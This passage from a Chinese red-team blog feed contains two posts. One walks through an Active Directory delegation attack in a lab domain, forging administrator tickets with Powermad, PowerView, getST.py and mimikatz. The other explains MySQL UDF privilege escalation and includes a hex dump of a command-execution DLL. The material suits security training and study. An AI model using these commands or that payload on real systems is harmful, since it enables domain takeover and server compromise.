src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505142501385.png" class title="image-20250505142501385"><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505142611134.png" class title="image-20250505142611134"><p>下面就是在c2上建立socks4a代理让Ubuntu能与域控通信,然后就是生成票据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 getST.py -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span> god.org/yankun$:<span class="hljs-number">123456</span> -spn cifs/dbadminx.god.org -impersonate administrator <br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505143142932.png" class title="image-20250505143142932"><p>接下来上传票据的控制机器上，然后先测试能否访问dbadminx的目录<code>dir \\dbadminx.god.org\c$</code></p><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505143423308.png" class title="image-20250505143423308"><p>结果显示是不行的，将票据注入到内存中再访问</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz kerberos::ptc administrator@cifs_dbadminx.god.org@GOD.ORG.ccache<br></code></pre></td></tr></table></figure><p>成功访问，注意一点目标机器（dbadminx）的防火墙必须放行文件打印机共享的445端口才会有回显，否则是找不到网络路径</p><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505143845334.png" class title="image-20250505143845334"><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505144339555.png" class title="image-20250505144339555"><p><strong>2、测试环境</strong></p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">域名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">god.org</span><br><span class="hljs-attribute">域控制器</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">DC</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.11</span><br><span class="hljs-attribute">域内服务器1(该机器为我们所控制的机器)</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">webadmin，加入域内web用户且是Acount Operators组成员</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.22</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.19.228.45</span><br><span class="hljs-attribute">域内服务器2(目标机器)</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">dbadminpcx，加入了域内dbamin用户</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.33</span><br><span class="hljs-attribute">攻击机</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Ubuntu</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.19.228.211</span><br></code></pre></td></tr></table></figure><p>如何添加web为Acount Operators组成员呢，需要在DC上设置</p><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505163414809.png" class title="image-20250505163414809"><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505163512408.png" class title="image-20250505163512408"><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505163546387.png" class title="image-20250505163546387"><p>现在开始实验</p><p>先查询Acount Operators组成员</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">adfind.exe -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">11</span>.<span class="hljs-number">11</span>:<span class="hljs-number">389</span> -s subtree -b CN=&quot;Account Operators&quot;,CN=Builtin,DC=god,DC=org member<br></code></pre></td></tr></table></figure><p>发现Acount Operators组成员正是我们控制的web用户</p><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505164039502.png" class title="image-20250505164039502"><p>创建机器账户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Import-Module</span> .\Powermad.ps1;<span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> yankunpc <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-Securestring</span> <span class="hljs-string">&quot;123456&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>) <span class="hljs-comment">#添加机器账户</span><br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505164508188.png" class title="image-20250505164508188"><p>在DC上可以查看是否创建</p><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505164531855.png" class title="image-20250505164531855"><p>设置dbadminpcx的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p><p>先获取yankunpc的sid值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Import-Module</span> .\Powerview.ps1;<span class="hljs-built_in">Get-NetComputer</span> yankunpc <span class="hljs-literal">-Properties</span> objectsid  <span class="hljs-comment">#获取新增计算机名yankunpc的sid，S-1-5-21-345784219-2510415755-3375813427-1115</span><br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505164913198.png" class title="image-20250505164913198"><p>设置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Import-Module</span> .\PowerView.ps1;<span class="hljs-variable">$SD</span> = <span class="hljs-built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-345784219-2510415755-3375813427-1115)&quot;</span>;<span class="hljs-variable">$SDBytes</span> = <span class="hljs-built_in">New-Object</span> byte[] (<span class="hljs-variable">$SD</span>.BinaryLength);<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, <span class="hljs-number">0</span>);<span class="hljs-built_in">Get-DomainComputer</span> DBADMINPCX| <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Set</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505165154972.png" class title="image-20250505165154972"><p>下面就是在c2上建立socks4a代理让Ubuntu能与域控通信,然后就是生成票据</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 getST<span class="hljs-selector-class">.py</span> -dc-ip <span class="hljs-number">192.168</span>.<span class="hljs-number">11.11</span> god.org/yankunpc$:<span class="hljs-number">123456</span> -spn cifs/dbadminpcx<span class="hljs-selector-class">.god</span><span class="hljs-selector-class">.org</span> -impersonate administrator <br></code></pre></td></tr></table></figure><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505165841717.png" class title="image-20250505165841717"><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505170705927.png" class title="image-20250505170705927"><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz kerberos::ptc administrator@cifs_dbadminpcx.god.org@GOD.ORG.ccache<br></code></pre></td></tr></table></figure><p>成功访问</p><img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505170736685.png" class title="image-20250505170736685"><p><strong>3、测试环境</strong></p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">域名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">god.org</span><br><span class="hljs-attribute">域控制器</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">DC</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.11</span><br><span class="hljs-attribute">域内服务器1(该机器为我们所控制的机器)</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">webpcx，加入域内web用户</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.22</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.19.228.45</span><br><span class="hljs-attribute">域内服务器2(目标机器)</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">dbadminx，也是加入了域内web用户</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.33</span><br><span class="hljs-attribute">攻击机</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Ubuntu</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.19.228.211</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL提权</title>
    <link href="/blog/2025/03/28/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E6%8F%90%E6%9D%83/MySQL/note/"/>
    <url>/blog/2025/03/28/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E6%8F%90%E6%9D%83/MySQL/note/</url>
    
    <content type="html"><![CDATA[<h3 id="UDF提权（常用）"><a href="#UDF提权（常用）" class="headerlink" title="UDF提权（常用）"></a>UDF提权（常用）</h3><ul><li><p>概念：</p><p>在 MySQL 里，UDF 指的是用户定义函数（User-Defined Function）。它允许你根据自身需求创建自定义函数，扩展 MySQL 原本的功能。</p></li><li><p>用途：</p><p>在拿下一个网站的webshell以后发现权限很低，使用其他方式还是不能提权，如果发现本地使用了mysql数据库并且权限是root权限，就可以新建管理员用户使用udf提权</p></li><li><p>条件：</p><p>要获取一个mysql的root权限的账号，拥有将动态链接库（windows是以dll为后缀，linux是以so为后缀）写入目录的权限。</p><p>然后接下来就是要查看mysql的一些信息：</p><p>查看版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select version();<br></code></pre></td></tr></table></figure><p>查看secure-file-priv是否有写入文件的权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show global variables like &quot;secure%&quot;;<br></code></pre></td></tr></table></figure><ul><li>当secure_file_priv 的值为 NULL ，表示限制mysqld 不允许导入|导出，无法进行提权</li><li>当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</li><li>当 secure_file_priv的值没有具体值时，表示不对 mysqld 的导入|导出做限制，可以提权</li></ul><p>查看plugin目录（将动态链接写入的地方）是否存在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select @@plugin_dir;<br>#或<br>show variables like &#x27;plugin%&#x27;;<br></code></pre></td></tr></table></figure><p>由于不同版本的mysql数据库对于上传的动态链接库的位置不同所以第一步就要看mysql的版本</p><table><thead><tr><th align="left">版本</th><th align="left">路径</th></tr></thead><tbody><tr><td align="left">MySQL &lt; 5.0</td><td align="left">导出路径随意</td></tr><tr><td align="left">5.0 &lt;&#x3D; MySQL &lt; 5.1</td><td align="left">需要导出至目标服务器的系统目录（如：C:\windows\system32\）</td></tr><tr><td align="left">5.1 &lt; MySQL</td><td align="left">必须导出到MySQL安装目录下的<code>lib\plugin</code>目录下（高版本mysql默认不存在<code>lib\plugin</code>目录，需要自己创建）</td></tr></tbody></table><p>由于mysql版本大于5.1，plugin文件夹默认不存在，需要创建。而这里就会面临一个问题，我只是登录上了mysql那么我怎么创建    plugin这个目录了？看文章可以使用NTFS 创建</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">select</span> @<span class="hljs-variable">@basedir</span>;<br><span class="hljs-comment">#查找到mysql的目录</span><br> <br><span class="hljs-attribute">select</span> <span class="hljs-string">&#x27;It is dll&#x27;</span> into dumpfile <span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::<span class="hljs-variable">$INDEX_ALLOCATION</span>&#x27;</span>;<br><span class="hljs-comment">#利用NTFS ADS创建lib目录</span><br> <br><span class="hljs-attribute">select</span> <span class="hljs-string">&#x27;It is dll&#x27;</span> into dumpfile <span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::<span class="hljs-variable">$INDEX_ALLOCATION</span>&#x27;</span>;<br><span class="hljs-comment">#利用NTFS ADS创建plugin目录</span><br></code></pre></td></tr></table></figure><p>其实还有一种，前提是获取网站权限并且有创建文件的权限（可以直接创建lib\plugin目录）</p></li><li><p>UDF文件的获取</p><p>可以通过sqlmap和msf中获取</p><p>sqlmap：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">#win<br>python  E:\Tools\sqlmap-master\extra\cloak\cloak.py -d -i E:\Tools\sqlmap-master\data\udf\mysql\windows\<span class="hljs-number">64</span>\lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll<br>#kali<br>python  /usr/share/sqlmap/extra/cloak/cloak.py -d -i  /usr/share/sqlmap/data/udf/mysql/linux/<span class="hljs-number">64</span>/lib_mysqludf_sys.so_  -o lib_mysqludf_sys.so<br></code></pre></td></tr></table></figure><p>msf：<br>可以直接在&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql目录下将文件cp出来</p><img src="/blog/2025/03/28/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E6%8F%90%E6%9D%83/MySQL/note/image-20250326202610101.png" class title="image-20250326202610101"><p>msf中的exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload模块也可以进行UDF提权，由于msf我不是很会使用，所以使用的话看这篇<a href="https://blog.csdn.net/qq_45300786/article/details/117202412">文章</a></p></li><li><p>得到UDF文件后：</p><p>需要将文件上传到目标服务器上可以使用wget，webshell，或者hex编码上传，使用hex编码上传可以看看<a href="https://www.sqlsec.com/udf/">国光师傅的文章</a></p></li><li><p>创建自定义函数：</p><ul><li><p>创建一张临时表用来存放DLL&#x2F;SO文件的十六进制内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE temp_udf(udf blob);<br></code></pre></td></tr></table></figure></li><li><p>将udf文件内容插入临时表中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#win<br>insert into temp_udf values(load_file(&#x27;E:\\Tools\\lib_mysqludf_sys.dll&#x27;));<br>or<br>#linux<br>insert into temp_udf values(load_file(&#x27;上传udf文件的位置&#x27;));<br></code></pre></td></tr></table></figure></li><li><p>导出</p><p>将临时表中的udf文件导出至对应位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#win<br>SELECT * FROM temp_udf INTO DUMPFILE &quot;E:\\Web\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugins\\udf.dll&quot;<br>or<br>#这是国光师傅的十六进制导入的方法<br>SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166eb8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701ddbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffff0000004800000000000000000000000000000000000000000000000000